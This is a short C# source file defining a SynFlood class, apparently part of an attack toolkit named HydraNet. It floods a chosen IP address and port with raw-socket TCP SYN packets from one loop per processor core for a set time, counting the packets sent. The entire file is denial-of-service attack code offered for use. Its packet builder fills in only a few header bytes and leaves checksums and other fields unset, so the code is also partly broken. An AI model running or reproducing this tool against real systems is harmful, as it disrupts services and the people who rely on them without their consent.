namespace HydraNet.Attacks;

using System.Net;
using System.Net.Sockets;

public sealed class SynFlood
{
    private long _packetsSent;

    public long TotalPackets => _packetsSent;

    public async Task ExecuteAsync(string targetIp, int targetPort, int durationSeconds, CancellationToken ct)
    {
        var endTime = DateTime.UtcNow.AddSeconds(durationSeconds);
        var endpoint = new IPEndPoint(IPAddress.Parse(targetIp), targetPort);

        var tasks = Enumerable.Range(0, Environment.ProcessorCount).Select(_ =>
            Task.Run(() => SendLoop(endpoint, endTime, ct), ct));

        await Task.WhenAll(tasks);
    }

    private void SendLoop(IPEndPoint target, DateTime endTime, CancellationToken ct)
    {
        var packet = BuildSynPacket(target);

        while (DateTime.UtcNow < endTime && !ct.IsCancellationRequested)
        {
            try
            {
                using var socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Tcp);
                socket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);
                socket.SendTo(packet, target);
                Interlocked.Increment(ref _packetsSent);
            }
            catch (SocketException)
            {
            }
        }
    }

    private static byte[] BuildSynPacket(IPEndPoint target)
    {
        var packet = new byte[40];
        packet[0] = 0x45;
        packet[9] = 0x06;
        Array.Copy(target.Address.GetAddressBytes(), 0, packet, 16, 4);
        packet[33] = 0x02;
        return packet;
    }
}
